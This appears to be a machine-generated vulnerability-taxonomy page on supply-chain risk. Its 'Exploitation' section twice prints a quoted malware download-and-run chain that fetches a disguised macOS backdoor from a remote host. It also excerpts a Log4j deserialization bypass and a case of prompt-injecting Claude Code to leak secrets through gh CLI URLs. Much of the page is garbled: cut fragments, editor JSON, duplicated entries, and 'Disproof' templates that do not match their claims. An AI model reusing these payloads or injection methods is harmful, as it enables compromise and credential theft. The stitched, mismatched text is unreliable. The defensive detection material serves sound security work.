<!-- GENERATED from db/wks.db — do not edit -->
# Dependency / Supply-Chain Risk

## Definition

Trust placed in a component, its registry or its build exceeds what was actually verified.

- **CWE:** 1104
- **OWASP:** A06:2021
- **Surface:** web
- **Aliases:** ["dependency confusion", "supply chain", "outdated component", "vulnerable dependency"]

Canonical home for `supply_chain`. Rendered from `db/wks.db` by `tools/taxonomy/build_taxonomy.py` — edit the rows, not this file.

## Root Cause

Not yet researched.

## Preconditions

Not yet researched.

## Attack Surface

Surface: **web**.

The entry points and enabling conditions for this surface are enumerated under **Preconditions**; the observable signals are under **Detection**.

## Detection

**A CI runner able to reach arbitrary network destinations will hand its inherited credentials to whatever a build step contacts, so build-time egress restriction is an access-control boundary rather than a hardening nicety.**

CI jobs routinely start with credentials already in their environment: cloud keys, package publish tokens, signing keys. If a malicious build step can open a connection to an arbitrary destination, those credentials leave with the request and no further exfiltration route is needed. Denying the small set of destinations a build has no business reaching is therefore a real control, and the question for a reviewer is which destinations a given pipeline still permits. The determination is made per pipeline, not from a tool's defaults.

*Disproof:* If the runner holds no credentials in its environment, or already denies all non-essential egress, reachability does not translate into credential exposure.

**Supply-chain attacks that avoid embedding malicious logic in the primary package and instead introduce a secondary dependency executed at install time are identifiable by a Node.js process spawning an OS-native execution path that fetches a remote payload, detached from the original process.**

Because the observed behavior is cross-platform and identical across Linux, Windows and macOS, a hunter can alert on the execution shape rather than on package names, which catches the delivery stage even when the package name is new and the primary package looks untouched. The signal to hunt is a build or install event where a language runtime spawns an OS-native binary that reaches out to the network. The claim is falsified as a hunting premise by build pipelines that block post-install scripts and never permit a package install to reach the network.

*Disproof:* Build pipelines that block post-install scripts and never permit a package install to reach the network would refute the claim as a hunting premise.

**A convincing observation for this class is: The compromise class is separate and has a distinct observable event: the registry account or maintainer credential is used to publish a malicious version and consumers who install it receive the trojanized code.**

Derived from supply_chain.fp_rule.cve_listed_for_dependency_is_not_compromise, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (supply_chain.fp_rule.cve_listed_for_dependency_is_not_compromise) states the full boundary.

**A convincing observation for this class is: Both halves of that statement - the publish and the consumer-side injection - are observable.**

Derived from supply_chain.validation.installed_artifact_matches_registry_publish_event, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (supply_chain.validation.installed_artifact_matches_registry_publish_event) states the full boundary.

## Exploitation

**The payload path itself triggers the Potential Binary Masquerading via Invalid Code Signature and Suspicious URL as argument to Self-Signed Binary endpoint rules, as it mimics Apple naming conventions ( com.apple.* ) but does not match expected signing characteristics.**

-s http://sfrclak.com:8000/6202033 \
 && chmod 770 /Library/Caches/com.apple.act.mond \
 && /bin/zsh -c \"/Library/Caches/com.apple.act.mond http://sfrclak.com:8000/6202033 &\" \ &> /dev/null" 
 The delivered file produced the following execution matching on the file name masquerading attempt and the self-signed code signature : 
 Elastic Defend behavior alert triggering on the macOS backdoor 
 The payload path itself triggers the Potential Binary Masquerading via Invalid Code Signature and Suspicious URL as argument to Self-Signed Binary endpoint rules, as it mimics Apple naming conventions ( com.apple.* ) but does not match expected signing characteristics. 
 com.apple.act.mond is a custom-built macOS backdoor compiled as a universal Mach-O binary (x86_64 and ARM64) using C++ and Xcode, with HTTP-based C2 communications via libcurl and a JSON command protocol. 
 On initial check-in, it fingerprints the host, collecting hostname, username, OS version, hardware model, timezone, and a full process listing ( ps -eo user,pid,command ), which surfaces via

*Disproof:* Refuted when: the resolved path stays inside the permitted base directory after the platform canonicalises it. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“The payload path itself triggers the Potential Binary Masquerading via Invalid C”) does not occur under a test that isolates that control.

**If it does not, the inner `get()` can still run unfiltered code in whatever *is* on that JVM.\n\n## Setting up detection for Java deserialization attacks\n1.**

ions 2.9.1 and 2.10.0 carry the field, but no FOIS, so the specific allowlist bypass does not apply there. We did not test every 2.x release, nor did we test Log4j 3 (discussion [#4168](https://archive.ph/Xowgn) says serialization is dropped there).\n\nThe defensive takeaway is the classpath: if the JVM that deserializes `LogEvent`s also ships a known gadget library, command execution is in play. If it does not, the inner `get()` can still run unfiltered code in whatever *is* on that JVM.\n\n## Setting up detection for Java deserialization attacks\n1. Deploy [Elastic Defend](https://www.elastic.co/docs/solutions/security/configure-elastic-defend) with process and network events on hosts that run JVMs (Complete EDR if you can).\n2. Enable the pre-built SIEM rules listed under Detection. \n3. Inventory processes that deserialize Java-serialized `LogEvent`s: leftover `TcpSocketServer`, `log4j-server` samples, `SerializedLayout` on a socket, or an

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“If it does not, the inner `get()` can still run unfiltered code in whatever *is*”) does not occur under a test that isolates that control.

**Chained together, they let an attacker-controlled object graph deserialize with no filter applied.**

https://github.com/apache/logging-log4j2/discussions/4168) on 1 July 2026 (`MarshalledObject.get()` deserializes with no Log4j filter). That discussion frames the work as 2.x hardening. Issue #4255 later named the same path.\n\n## How the Java deserialization allowlist bypass works\nNone of the pieces here is a bug on its own. The bypass comes from three behaviors in the official `2.26.1` source. Chained together, they let an attacker-controlled object graph deserialize with no filter applied. Here they are in order:\n\n| Step | Component | Behaviour | Why it matters |\n| :---- | :---- | :---- | :---- |\n| 1 | `SerializationUtil.REQUIRED_JAVA_CLASSES` | `java.rmi.MarshalledObject` sits on the allowlist as a Message delegate | The carrier class is permitted by design |\n| 2 | `FilteredObjectInputStream.resolveClass()` | Checks only class descriptors present on the stream it reads | A pa

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“Chained together, they let an attacker-controlled object graph deserialize with ”) does not occur under a test that isolates that control.

**An unpinned CI action or workflow reference is a demonstrable supply-chain exposure only when two resolutions of the same tag name yield different commit SHAs.**

An unpinned workflow reference like '@v1' or 'main' is mutable: the tag can be moved or deleted by anyone with write access to the upstream repository, so the code your pipeline runs is not fixed by your repository. The demonstration is a resolution diff: resolve the tag twice through git ls-remote with a gap of hours or days and compare the SHAs. Different SHAs for the same tag is the finding. The blast radius is which workflows in which repositories reference the tag and whether each consumer would execute whatever the tag now resolves to on its next run. A tag pinned to a full-length commit SHA is immutable by comparison.

*Disproof:* The claim is false when both resolutions return the same SHA, which means the ref was stable across the observation window. It is also false if the consumer already pins a full-length commit SHA and merely carries a comment naming a friendly tag. A moved ref that re-points at identical bytes changes nothing; verify the commit before reporting.

**A dependency's postinstall script that reaches the network is a delivery stage, detectable by a child process fetching a remote payload detached from the original process.**

Supply-chain attacks that avoid embedding malicious logic in the primary package instead introduce a secondary dependency executed at install time. The signal is a build or install event where a language runtime spawns an OS-native binary that reaches out to the network. The hunt procedure is to instrument a sandbox before installing: a process-creation trace, a filesystem watcher on paths outside node_modules, and an egress log. Then run the install and correlate. The pass condition is a captured effect tied to that install: a child process with the dependency's script as its parent, a file created in a directory the package should never write, or a DNS or TCP event to a host that appears nowhere in the package's own documentation. Static presence of a postinstall script fails the test on its own.

*Disproof:* Refuted if no lifecycle script executed during the install - because the install ran with --ignore-scripts, in a mode that suppresses them, or because the script's condition did not match your platform. It is also false if the only effect was a compilation step confined to the package's own build directory. A script whose observed outbound connection is to a registry or CDN the package's own dependency tree legitimately resolves at install time is not exfiltration.

**We are not claiming complete detection of every custom deserializer.\n\n## How this Java deserialization vulnerability differs from Log4Shell\nLog4j 2 can *emit* log events over the network (for example, `SocketAppender`).**

alize log-event streams; bypasses of that allowlist are treated as hardening, not as product vulnerabilities; the application that deserializes is responsible for validating the byte stream.\n\nThis post is grounded in public sources, Apache's own security page, discussion [logging-log4j2#4168](https://github.com/apache/logging-log4j2/discussions/4168), and a lab we ran on official `2.26.1` JARs. We are not claiming complete detection of every custom deserializer.\n\n## How this Java deserialization vulnerability differs from Log4Shell\nLog4j 2 can *emit* log events over the network (for example, `SocketAppender`). A separate process can *receive* those events. One historical way of receiving events was Java serialization: read an `ObjectInputStream` and cast to `LogEvent`.\n\nThat receive style is how [CVE-2017-5645](https://nvd.nist.gov/vuln/detail/CVE-2017-5645) worked. Apache's advisory: when the TCP or UDP socket server received serialized log events, a crafted binary payload could execute code. Affect

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“We are not claiming complete detection of every custom deserializer.\n\n## How t”) does not occur under a test that isolates that control.

**A compromised maintainer account publishing malicious versions to a namespace with many dependents propagates with no new vulnerability required.**

Registry publish tokens are bearer credentials for a package namespace. Holding one means the attacker can release a new version that every downstream consumer installs by default, so the blast radius grows with no new attack. The axios operation ESET documented is exactly this: the lead maintainer's compromised credentials were used to publish malicious versions of a library with over 100 million weekly downloads. The signal to hunt is a publish event on the package account that occurred outside the maintainer's normal release window, or a version whose publish timestamp falls inside an incident window. Defensive review should look for provenance binding, publish-time attestation and short token lifetime rather than assuming rotation is immediate.

*Disproof:* Refuted when the token is scoped to a single immutable version, already revoked, or otherwise unable to publish, no further version can be shipped and propagation does not occur. If the compromised account has no write access to the namespace, the finding reduces to scope hygiene.

**The receiver can still look healthy and fall back to `SimpleMessage(messageString)`.\n\n`MarshalledObject.get()` deserializes `objBytes` on an inner `ObjectInputStream` that is not a `FilteredObjectInputStream`.**

= null) {\n try {\n return marshalledMessage.get();\n } catch (final Exception ex) {\n // ignore me\n }\n }\n return new SimpleMessage(messageString);\n}\n```\n\nSource: [`Log4jLogEvent.java` at `rel/2.26.1`](https://github.com/apache/logging-log4j2/blob/rel/2.26.1/log4j-core/src/main/java/org/apache/logging/log4j/core/impl/Log4jLogEvent.java#L1265-L1274). Any exception from `get()` is processed. The receiver can still look healthy and fall back to `SimpleMessage(messageString)`.\n\n`MarshalledObject.get()` deserializes `objBytes` on an inner `ObjectInputStream` that is not a `FilteredObjectInputStream`. On JDK 9+, `MarshalledObject` can copy the *enclosing* stream's JEP 290 `ObjectInputFilter`. `FilteredObjectInputStream` in 2.26.1 does not call `setObjectInputFilter()`, so that copy is `null` unless something else installed a filter. Discussion #4168 states the same Java 8 / Java 9+ split.\n\nLog4j already has a nested-object path that *re-applies* the filter: `SerializationUtil.writeWrappedObj

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“The receiver can still look healthy and fall back to `SimpleMessage(messageStrin”) does not occur under a test that isolates that control.

**The payload path itself triggers the Potential Binary Masquerading via Invalid Code Signature and Suspicious URL as argument to Self-Signed Binary endpoint rules, as it mimics Apple naming conventions ( com.apple.* ) but does not match expected signing characteristics.**

-s http://sfrclak.com:8000/6202033 \
 && chmod 770 /Library/Caches/com.apple.act.mond \
 && /bin/zsh -c \"/Library/Caches/com.apple.act.mond http://sfrclak.com:8000/6202033 &\" \ &> /dev/null" 
 The delivered file produced the following execution matching on the file name masquerading attempt and the self-signed code signature : 
 Elastic Defend behavior alert triggering on the macOS backdoor 
 The payload path itself triggers the Potential Binary Masquerading via Invalid Code Signature and Suspicious URL as argument to Self-Signed Binary endpoint rules, as it mimics Apple naming conventions ( com.apple.* ) but does not match expected signing characteristics. 
 com.apple.act.mond is a custom-built macOS backdoor compiled as a universal Mach-O binary (x86_64 and ARM64) using C++ and Xcode, with HTTP-based C2 communications via libcurl and a JSON command protocol. 
 On initial check-in, it fingerprints the host, collecting hostname, username, OS version, hardware model, timezone, and a full process listing ( ps -eo user,pid,command ), which surfaces via

*Disproof:* Refuted when: the resolved path stays inside the permitted base directory after the platform canonicalises it. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“The payload path itself triggers the Potential Binary Masquerading via Invalid C”) does not occur under a test that isolates that control.

**The exception is 2.8.2: there, `TcpSocketServer` and the (log4j-core) `FilteredObjectInputStream` both ship in core, so a stock deployment using the built-in socket server is exposed without any leftover or custom receiver. #4255 bypasses the CVE-2017-5645 fix inside the same release that introduced it.**

`TcpSocketServer` / `ObjectInputStreamLogEventBridge` are gone from current `2.x` `log4j-core` sources. For current versions, the remaining exposure is leftover or custom code that still does new `FilteredObjectInputStream(socket.getInputStream())` and `readObject()` into a `LogEvent`. Historical `TcpSocketServer` constructed new `ServerSocket(port)`, which listens on all interfaces of that host. The exception is 2.8.2: there, `TcpSocketServer` and the (log4j-core) `FilteredObjectInputStream` both ship in core, so a stock deployment using the built-in socket server is exposed without any leftover or custom receiver. #4255 bypasses the CVE-2017-5645 fix inside the same release that introduced it. Whether a given leftover collector is reachable without credentials depends on how it was deployed. We are not stating that every collector is unauthenticated.\n\n## What we reproduced on Log4j 2.26.1\nWe used official Maven Central `log4j-api` 2.26.1 and `log4j-core` 2.26.1. The receiver implemented the public FOIS-plus-`LogEvent` read, bound to loopback for the run.\n\n* A class that `FilteredO

*Disproof:* Refuted when: the payload is rejected when the same check runs with the defensive control ENABLED (a strict allowlist, a normalisation pass, or a WAF rule) rather than disabled. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“The exception is 2.8.2: there, `TcpSocketServer` and the (log4j-core) `FilteredO”) does not occur under a test that isolates that control.

**Treat it as possible gadget execution from a Java deserialization or injection path, and check whether that JVM is a log-event receiver.\n\n## Hunting for Java deserialization attacks\nHunting queries could return high signals or false positives.**

github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/execution_shell_execution_via_java_parent_process.toml) \n* [Unusual File Creation by Web Server](https://github.com/elastic/detection-rules/blob/main/rules_building_block/persistence_web_server_sus_file_creation.toml)\n\nIf you see `java` spawn `bash`/`sh` without an LDAP/RMI/DNS precursor, do not pin it as a Log4Shell miss. Treat it as possible gadget execution from a Java deserialization or injection path, and check whether that JVM is a log-event receiver.\n\n## Hunting for Java deserialization attacks\nHunting queries could return high signals or false positives. These queries identify potentially suspicious behavior, but an investigation is required to validate the findings.\n\n### Hunting for leftover serialized LogEvent collectors\nGoal: find JVMs that *accept* TCP connections, especially on hosts that are not supposed to be log-event hubs.\n\n[Persistence Through Reverse/Bind Shells](https://github.com/elastic/detection-rules/blob/main/hunting/linux/d

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "Treat it as possible gadget execution from a Java deserialization or injection path, and c".

**After confirming the bypass against Log4j `2.26.1` via PoC validation and peeling back the layers on the prerequisites, we concluded this is not another Log4Shell. \n\nEither way, the detections we shared fire on what comes post-exploit for this family of vulnerabilities.**

ion](https://attack.mitre.org/techniques/T1190/) \n* [Command and Scripting Interpreter: Unix Shell](https://attack.mitre.org/techniques/T1059/004/) \n* [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210/)\n\n## Conclusion\nWe dug into issue #4255 as soon as it surfaced. After the last few years, anything pairing “Log4j” with remote code execution earns an immediate look. After confirming the bypass against Log4j `2.26.1` via PoC validation and peeling back the layers on the prerequisites, we concluded this is not another Log4Shell. \n\nEither way, the detections we shared fire on what comes post-exploit for this family of vulnerabilities. Commonly, a Java process spawns a shell after a connection. None are inherently a signature of #4255 exploitation, but triage can trace them back during investigation. Inventory your `LogEvent` receivers, hunt Java listeners on unexpected ports, and if you still deserialize Java `LogEvent` streams, look at alternatives, such as adding an `ObjectInputFilter` if using JDK 9. Assume FOIS alone is no

*Disproof:* Refuted when: the payload is rejected when the same check runs with the defensive control ENABLED (a strict allowlist, a normalisation pass, or a WAF rule) rather than disabled. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“After confirming the bypass against Log4j `2.26.1` via PoC validation and peelin”) does not occur under a test that isolates that control.

**Apache does not class allowlist bypasses like this one as product vulnerabilities, because Log4j does not deserialize data during normal logging.**

ed in August is a Java deserialization vulnerability in Log4j 2's `FilteredObjectInputStream`, and we reproduced it on official Maven Central `log4j-api` and `log4j-core 2.26.1`. Getting to command execution took two more things that Log4j itself does not ship. You need a process that still deserializes Java-serialized `LogEvent` objects, and you need a gadget library already sitting on that JVM. Apache does not class allowlist bypasses like this one as product vulnerabilities, because Log4j does not deserialize data during normal logging. In this post, we will cover:\n\n* The mechanism, cited from the official `2.26.1` source, and how it differs from Log4Shell.\n* What we did and did not observe in the lab, including the two conditions for command execution.\n* Which Elastic rules would fire on post-exploitation.\n* Hunting queries for Java-spawned shells and leftover serialized `LogEvent` collectors.\n\n## Why Apache does not cla

*Disproof:* Refuted when: the payload is rejected when the same check runs with the defensive control ENABLED (a strict allowlist, a normalisation pass, or a WAF rule) rather than disabled. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“Apache does not class allowlist bypasses like this one as product vulnerabilitie”) does not occur under a test that isolates that control.

**If you need to know which tenant an event came from, this is how. */\n| WHERE user.name == \"svc-deploy\" AND event.category == \"authentication\"\n| KEEP _index, @timestamp, event.action, source.ip, host.name\n /* KEEP is not cosmetic.**

h no edits. ","attrs":{"style":{"font-size":"11pt"}}}]},{"uid":"926c1ce8624240f59b682fbc73990e0a","type":"esqlSnippet","attrs":{"code":"/*\n Broad sweep: hunt one user's activity across every linked project.\n*/\nFROM logs-* METADATA _index\n /* METADATA _index is your project attribution. Linked-project rows arrive\n with the project alias as an index prefix; there is no ECS \"project\"\n field. If you need to know which tenant an event came from, this is how. */\n| WHERE user.name == \"svc-deploy\" AND event.category == \"authentication\"\n| KEEP _index, @timestamp, event.action, source.ip, host.name\n /* KEEP is not cosmetic. Dragging full _source at depth was many times\n slower than projecting columns in our testing. If a cross-project query\n feels slow, check this before you blame the fan-out. */\n| SORT @timestamp DESC\n| LIMIT 500"},"children":[{"text":""}]},{"uid":"acbee15c9fcd40d29fc72518a4df15d2","type":"p","children":[{"text":""}],"attrs":{}},{"uid":"36f15cd16e8c4b6b9a44352c47a0c767","type":"image","attrs":{

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“If you need to know which tenant an event came from, this is how. */\n| WHERE us”) does not occur under a test that isolates that control.

**Both coincide at 2.8.2 (FOIS in log4j-core) and at 2.11.0 through 2.26.1 (FOIS in log4j-api); we confirmed command execution on 2.8.2 and on 2.11.0–2.26.1. Versions 2.9.1 and 2.10.0 carry the field, but no FOIS, so the specific allowlist bypass does not apply there.**

ctInputStream` in `log4j-api` |\n| :---- | :---- | :---- |\n| `2.6.2`, `2.7` | absent | absent |\n| `2.8` | present | absent |\n| `2.8.2` | present | present (log4j-core) |\n| `2.9.1,` `2.10.0` | present | absent |\n| `2.11.0` through `2.26.1` | present | present (log4j-api) |\n\nThe bypass requires both the `marshalledMessage` field and a `FilteredObjectInputStream` to be the bypassed component. Both coincide at 2.8.2 (FOIS in log4j-core) and at 2.11.0 through 2.26.1 (FOIS in log4j-api); we confirmed command execution on 2.8.2 and on 2.11.0–2.26.1. Versions 2.9.1 and 2.10.0 carry the field, but no FOIS, so the specific allowlist bypass does not apply there. We did not test every 2.x release, nor did we test Log4j 3 (discussion [#4168](https://archive.ph/Xowgn) says serialization is dropped there).\n\nThe defensive takeaway is the classpath: if the JVM that deserializes `LogEvent`s also ships a known gadget library, command execution is in play. If it does not, the inner `get()` can still run unfiltered code in whatever *is* on that JVM.\n\n## Settin

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "Both coincide at 2.8.2 (FOIS in log4j-core) and at 2.11.0 through 2.26.1 (FOIS in log4j-ap".

**Public writeup evidence for supply_chain: CI workflow -> supply chain.**

HARVESTED FROM bugbountydaily RSS -> https://flatt.tech/research/posts/poisoning-claude-code-one-github-issue-to-break-the-supply-chain/
Reason it matters: CI workflow -> supply chain.

The gh CLI accepts URLs as positional arguments, so a prompt injection payload can instruct Claude to embed secret values in the URL path or query parameters (e.g., gh issue view https://example.com/ ), sending the secrets to an attacker-controlled server.

*Disproof:* Refuted if the fetched page no longer contains this exact span, or if the described behaviour is corrected or withdrawn by the publisher.

**A stolen package publish token lets an attacker ship further malicious versions, so one credential compromise propagates with no additional vulnerability required.**

Registry publish tokens are bearer credentials for a package namespace. Holding one means the attacker can release a new version that every downstream consumer installs by default, so the blast radius grows with no new attack. This changes how a token leak is scoped: the finding is not one exposed token but an attacker-controlled package namespace until the token is rotated and the account secured. Defensive review should look for provenance binding, publish-time attestation and short token lifetime rather than assuming rotation is immediate.

*Disproof:* If the token is scoped to a single immutable version, already revoked, or otherwise unable to publish, no further version can be shipped and propagation does not occur.

## Variations

**Dependency confusion: a private package registry can be bypassed when an attacker publishes a package with the same name to a public registry, and the build tooling resolves the public version because it is not explicitly configured to prefer the private source for that namespace.**

Dependency confusion exploits the default behavior of many package managers and CI pipelines. When a private registry is configured, tools often fall back to the public registry for anything not explicitly mapped. An attacker who registers a name that exists in the target's private scope but is unused in the public side can publish a malicious version. The victim's build then silently downloads the attacker's package instead of ever reaching the private registry. The hunting signal is a build log or process tree where a Node.js or Python process resolves a package from a public CDN URL rather than the configured private mirror, especially for names matching the target's internal package scope. Evidence: the resolved package was downloaded from a public host, not the private registry.

*Disproof:* Refuted when the build explicitly configures the private registry with a scope mapping and the public fallback is disabled, or when the attacker's package name does not collide with any private namespace. If the build never reaches the network for the package name, or the resolution is pinned to a single authoritative source, the bypass does not occur.

**Typosquatting: a package name one or two characters off from a popular dependency bypasses exact-name allowlisting because resolution is by string match, not semantic equivalence.**

Typosquatting in the supply chain relies on the fact that dependency manifests compare package names as exact strings. A package published as 'lodash' vs 'loadsh' or 'react' vs 'reat' will not be flagged as a typo if the allowlist contains the legitimate name but not the forged one. The attacker only needs to guess the popular name once; the downstream consumer's exact-match lookup silently installs the malicious package. The hunt signal is a dependency manifest containing a package name that is a known popular library with a one-character mutation, especially one that has no corresponding README or release history.

*Disproof:* Refuted when the dependency scanner compares the requested name against an allowlist that includes semantic variants, or when the package registry rejects the typosquatted name on creation. If the scanner is whitelist-based but compares by fuzzy match, the bypass fails.

## Technology / Framework Considerations

Not yet researched.

## API Considerations

Not yet researched.

## Attack Chains

- `ci-credential-to-self-propagating-poisoned-artifact` — CI credential exposure to self-propagating poisoned artifact to re-executing host delivery (goal: `persistent_host_execution`)

## Real-World Examples

Not yet researched.

## Common False Positives

**A CVE recorded against a third-party library in your dependency tree is evidence of an unmaintained or vulnerable component, not of supply-chain compromise, because compromise requires the attacker to have published or substituted the artifact your build actually consumed.**

The lookalike: a dependency scan returns a CVE for a package you depend on, the CVE text describes trojanized code injected into that library, and it is filed as a supply-chain compromise of your application. It is not. CWE-1104 is about relying on unmaintained components and the resulting difficulty of fixing significant bugs - that is a hygiene and patchability finding, not proof that anyone reached your build. The compromise class is separate and has a distinct observable event: the registry account or maintainer credential is used to publish a malicious version and consumers who install it receive the trojanized code. The axios operation ESET documented is exactly that - the lead maintainer's compromised credentials were used to publish malicious versions of a library with over 100 million weekly downloads, injecting trojanized code into affected systems before detection and removal. Note also that the rising count of registered vulnerabilities in third-party software is driven largely by AI-assisted discovery, which increases the number of CVEs without any increase in compromises. Discriminator: did the artifact your build resolved differ from the upstream published artifact? If the installed bytes match the published release and no unauthorized publish event exists on the package, you have a CVE to patch, not a compromise to report.

*Disproof:* Refuted as a compromise claim when the version your build resolved matches the legitimate published release of the package, no unauthorized publish or account-takeover event exists on the registry, and the finding reduces to the CVE identifier in a scan report; refuted as unmaintained-component exposure only when the CVE's fixed version is already present in your lockfile.
**Hypothesis:** A CVE recorded against a third-party library in the dependency tree means the build was compromised by a supply-chain attack.
- Invalidated by: The resolved artifact matched the registry-published hash and no unauthorized publish, yank, or token-scope event existed on the account; the CVE described a defect in the legitimate release, which is a patch, not a compromise.
- **Rejection rule:** A CVE in a dependency scan is a patchability finding, not a supply-chain compromise. Compromise requires either a byte-level mismatch between the resolved artifact and the registry-published one, or an unauthorized publish event on the package account. Check both before filing.

## Validation

**A supply-chain compromise is confirmed only by a mismatch between the artifact your build or runtime actually resolved and the artifact the upstream registry published for that version, corroborated by an unauthorized publish event on the package account.**

Two independent checks, because either alone produces false positives. Check one, the artifact comparison: for the exact version string your lockfile or deployed image resolved, compare the bytes or the lockfile integrity hash against the hash the registry publishes for that version, and record whether they match. A match means the bytes you ran are the bytes the maintainer published, which eliminates the injected-payload case entirely - you cannot be running trojanized code that the registry does not carry. Check two, the publish event: look for a publish, yank, or token-scope event on the package account that occurred outside the maintainer's normal release window, or a version whose publish timestamp falls inside an incident window. The real axios case shows what corroboration looks like in practice: the lead maintainer's compromised credentials were used to publish malicious versions of a library with over 100 million weekly downloads, the injected code reached affected systems, and it was detected and removed. Both halves of that statement - the publish and the consumer-side injection - are observable. When your hash matches and no anomalous publish exists, the finding is a CVE to patch, and the regression check is to rerun the hash comparison on every build so a future mismatch is caught where it appears rather than inferred from a scan.

*Disproof:* Refuted when the integrity hash of the resolved artifact matches the registry-published hash for that exact version and no unauthorized publish, yank, or token-scope event exists on the package account; absent either the byte mismatch or the publish-event evidence, the CVE in the scan report is a patchability finding.

**A supply-chain compromise is confirmed only by a mismatch between the artifact the build actually resolved and the artifact the upstream registry published for that version, corroborated by an unauthorized publish event.**

Two independent checks, because either alone produces false positives. Check one, the artifact comparison: for the exact version string your lockfile or deployed image resolved, compare the bytes or the lockfile integrity hash against the hash the registry publishes for that version, and record whether they match. A match means the bytes you ran are the bytes the maintainer published, which eliminates the injected-payload case entirely. Check two, the publish event: look for a publish, yank, or token-scope event on the package account that occurred outside the maintainer's normal release window, or a version whose publish timestamp falls inside an incident window. Both halves must be observable. When your hash matches and no anomalous publish exists, the finding is a CVE to patch, not a compromise to report.

*Disproof:* Refuted when the integrity hash of the resolved artifact matches the registry-published hash for that exact version and no unauthorized publish, yank, or token-scope event exists on the package account. Absent either the byte mismatch or the publish-event evidence, the CVE in the scan report is a patchability finding, not a compromise.

**A leaked credential in a build artifact is a compromise only when the string extracted from the artifact authenticates successfully against the service it names - a valid token response, not a plausible-looking placeholder that the registry rejects.**

Extract candidate secrets from the artifact itself, not from the build log or the repository: unpack the published tarball, wheel, container layer, or downloaded binary, then grep the unpacked bytes for token patterns - npm_ and _authToken values, ghp_ and gho_ prefixes, AKIA, xoxb, glpat, base64 blobs assigned to a variable named token or password. For each candidate, prove it works by making one authenticated, read-only, non-mutating call to the named service with the candidate substituted for your own credential: npm whoami, git ls-remote against a repo you can read, gh api user, sts GetCallerIdentity, a Slack auth.test. The pass condition is a response body naming the credential's own identity - a username, an account id, an ARN - rather than a 401. That identity is the finding: it tells you whose access leaked and at what scope. Then run the negative control, which is what separates this from a grep hit on a test fixture: an identical-looking string from a public README must fail the same call, proving the call discriminates. Record the credential prefix, the file and offset inside the artifact, the identity returned, and the failing control.

*Disproof:* The claim is false when the candidate is rejected by the service - a 401 or an expired-token error is a placeholder, a documentation sample, or an already-revoked key, and reporting it as a live leak is the standard false positive here. It is also false when the only place the string appears is in a test fixture, an example file, or a fixture directory inside a source tree that is excluded from the published package, which is why the extraction target must be the shipped artifact rather than the repository. And it is false as an active compromise if the credential is scoped to an organization you are already authorized to test with a lower-privilege token of your own; in that case the correct claim is about scope hygiene rather than a stolen credential, and the report must say which account the token belonged to.

**An install-time execution finding requires the dependency's lifecycle script to actually run during the install you performed and to produce an observable effect you captured - a spawned process, a file written outside the package directory, or an outbound connection - not merely a postinstall entry existing in the published package.json.**

Read the package's scripts block from the tarball you unpacked, then install it in a sandbox you control and watch what happens. The life cycle order matters because it defines what you are looking at: preinstall, install, postinstall and prepare all fire as part of an ordinary install, with the ones after module extraction running after the package is in place. Instrument the sandbox before installing - a process-creation trace, a filesystem watcher on paths outside node_modules, and an egress log - then run the install and correlate. The pass condition is a captured effect tied to that install: a child process with the dependency's script as its parent, a file created in a directory the package should never write, a DNS or TCP event to a host that appears nowhere in the package's own documentation. Static presence of a postinstall script fails the test on its own, and so does a script whose body is a benign build step - many legitimate native modules compile on install, which is why the observable has to be an effect rather than the invocation. To separate malice from packaging necessity, install the same package at two adjacent versions and compare whether the script body and its effects changed between them; a new outbound destination in a patch release is a far stronger signal than a build step that has always been there.

*Disproof:* The claim is false if no lifecycle script executed during your install - because the install ran with --ignore-scripts, in a mode that suppresses them, or because the script's condition did not match your platform - and a script you never observed running proves nothing about execution. It is also false if the only effect was a compilation step confined to the package's own build directory producing the artifact the package documents it produces, which is normal packaging behaviour rather than a second delivery stage. And it is false where the observed outbound connection is to a registry or CDN the package's own dependency tree legitimately resolves at install time; trace the connection to a host that appears nowhere in the declared dependencies before treating it as exfiltration.

**A tampered dependency is proved by recomputing the digest of the bytes your build actually consumed and showing it differs from the digest recorded in the lockfile or published by the registry - a version diff alone never establishes this.**

